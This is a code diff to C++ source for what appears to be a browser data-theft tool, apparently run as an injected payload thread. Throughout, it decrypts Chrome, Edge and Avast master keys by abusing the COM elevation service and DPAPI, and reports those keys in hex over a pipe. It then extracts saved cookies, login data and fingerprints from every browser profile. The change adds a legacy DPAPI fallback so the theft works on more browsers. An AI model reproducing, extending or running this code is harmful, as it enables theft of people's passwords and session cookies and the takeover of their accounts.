@@ -19,8 +19,12 @@ struct ThreadParams {
     LPVOID lpPipeName;
 };
 
-// Returns empty vector on failure, sets errorMsg if provided
-std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr) {
+// Returns empty vector on failure, sets errorMsg if provided.
+// prefixSkip: number of bytes to strip from the start of the base64-decoded blob.
+//   4 = skip 4-byte version header present in app_bound_encrypted_key blobs.
+//   5 = skip the literal "DPAPI" prefix present in legacy encrypted_key blobs.
+//   0 = return the raw decoded bytes without stripping anything.
+std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localState, const std::string& keyName, std::string* errorMsg = nullptr, size_t prefixSkip = 4) {
     std::ifstream f(localState, std::ios::binary);
     if (!f) {
         if (errorMsg) *errorMsg = "Cannot open Local State";
@@ -29,11 +33,16 @@ std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localSta
 
     std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
 
+    // Search for both compact ("key":"value") and spaced ("key": "value") JSON formats.
     std::string tag = "\"" + keyName + "\":\"";
     size_t pos = content.find(tag);
     if (pos == std::string::npos) {
-        if (errorMsg) *errorMsg = "Key not found: " + keyName;
-        return {};
+        tag = "\"" + keyName + "\": \"";
+        pos = content.find(tag);
+        if (pos == std::string::npos) {
+            if (errorMsg) *errorMsg = "Key not found: " + keyName;
+            return {};
+        }
     }
 
     pos += tag.length();
@@ -47,7 +56,7 @@ std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localSta
 
     DWORD size = 0;
     CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr);
-    if (size < 5) {
+    if (size < prefixSkip + 1) {
         if (errorMsg) *errorMsg = "Invalid key data (too small)";
         return {};
     }
@@ -55,8 +64,7 @@ std::vector<uint8_t> GetEncryptedKeyByName(const std::filesystem::path& localSta
     std::vector<uint8_t> data(size);
     CryptStringToBinaryA(b64.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr);
 
-    // Skip first 4 bytes (version prefix)
-    return std::vector<uint8_t>(data.begin() + 4, data.end());
+    return std::vector<uint8_t>(data.begin() + prefixSkip, data.end());
 }
 
 std::string KeyToHex(const std::vector<uint8_t>& key) {
@@ -92,64 +100,72 @@ DWORD WINAPI PayloadThread(LPVOID lpParam) {
                 pipe.LogDebug("Warning: Syscall initialization failed.");
             }
 
-            // Get ABE key - this tool only works with App-Bound Encryption
+            // Get ABE key - prefer App-Bound Encryption, fall back to legacy DPAPI
             std::string error;
             auto encKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "app_bound_encrypted_key", &error);
 
-            if (encKey.empty()) {
-                // Check if legacy DPAPI key exists
-                auto legacyKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "encrypted_key");
-                if (!legacyKey.empty()) {
-                    pipe.Log("NO_ABE:Browser uses legacy DPAPI encryption (App-Bound Encryption not enabled)");
+            std::vector<uint8_t> masterKey;
+
+            if (!encKey.empty()) {
+                // App-Bound Encryption path: decrypt key via COM elevator
+                Com::Elevator elevator;
+                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
+                pipe.Log("KEY:" + KeyToHex(masterKey));
+
+                // Extract Copilot key for Edge
+                if (browser.name == "Edge") {
+                    auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
+                    if (!asterEncKey.empty()) {
+                        try {
+                            Com::Elevator asterElevator;
+                            auto asterKey = asterElevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
+                            pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
+                        } catch (...) {
+                            // Aster key decryption failed - silently continue
+                        }
+                    }
+                }
+            } else {
+                // Attempt legacy DPAPI fallback.
+                // Chrome/Edge store the legacy key as base64("DPAPI" + <DPAPI-blob>) under
+                // "encrypted_key".  We strip the 5-byte "DPAPI" prefix (prefixSkip=5) and call
+                // CryptUnprotectData to recover the 32-byte AES key used for v10 blobs.
+                auto dpApiBlob = GetEncryptedKeyByName(browser.userDataPath / "Local State", "encrypted_key", nullptr, 5);
+                if (!dpApiBlob.empty()) {
+                    DATA_BLOB input  = { static_cast<DWORD>(dpApiBlob.size()), dpApiBlob.data() };
+                    DATA_BLOB output = {};
+                    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
+                        masterKey = std::vector<uint8_t>(output.pbData, output.pbData + output.cbData);
+                        LocalFree(output.pbData);
+                        pipe.Log("DPAPI_KEY:" + KeyToHex(masterKey));
+                    } else {
+                        pipe.Log("NO_ABE:Browser uses legacy DPAPI encryption (CryptUnprotectData failed: " + std::to_string(GetLastError()) + ")");
+                    }
                 } else {
                     pipe.Log("NO_ABE:No encryption key found in Local State");
                 }
-                // Exit gracefully - pipe destructor will send completion signal
-            } else {
-
-            // Decrypt the key using COM elevator
-            std::vector<uint8_t> masterKey;
-            {
-                Com::Elevator elevator;
-                masterKey = elevator.DecryptKey(encKey, browser.clsid, browser.iid, browser.iid_v2, browser.name == "Edge", browser.name == "Avast");
             }
 
-            // Send key as structured message
-            pipe.Log("KEY:" + KeyToHex(masterKey));
+            if (!masterKey.empty()) {
+                DataExtractor extractor(pipe, masterKey, config.outputPath);
 
-            // Extract Copilot key for Edge
-            if (browser.name == "Edge") {
-                auto asterEncKey = GetEncryptedKeyByName(browser.userDataPath / "Local State", "aster_app_bound_encrypted_key");
-                if (!asterEncKey.empty()) {
+                for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
                     try {
-                        Com::Elevator elevator;
-                        auto asterKey = elevator.DecryptKeyEdgeIID(asterEncKey, browser.clsid, browser.iid);
-                        pipe.Log("ASTER_KEY:" + KeyToHex(asterKey));
-                    } catch (...) {
-                        // Aster key decryption failed - silently continue
-                    }
-                }
-            }
-
-            DataExtractor extractor(pipe, masterKey, config.outputPath);
-
-            for (const auto& entry : std::filesystem::directory_iterator(browser.userDataPath)) {
-                try {
-                    if (entry.is_directory()) {
-                        if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
-                            std::filesystem::exists(entry.path() / "Login Data")) {
-                            extractor.ProcessProfile(entry.path(), browser.name);
+                        if (entry.is_directory()) {
+                            if (std::filesystem::exists(entry.path() / "Network" / "Cookies") ||
+                                std::filesystem::exists(entry.path() / "Login Data")) {
+                                extractor.ProcessProfile(entry.path(), browser.name);
+                            }
                         }
+                    } catch (...) {
+                        // Continue to next profile if one fails
                     }
-                } catch (...) {
-                    // Continue to next profile if one fails
                 }
-            }
 
-            if (config.fingerprint) {
-                FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
-                fingerprinter.Extract();
-            }
+                if (config.fingerprint) {
+                    FingerprintExtractor fingerprinter(pipe, browser, config.outputPath);
+                    fingerprinter.Extract();
+                }
             }
 
         } catch (const std::exception& e) {
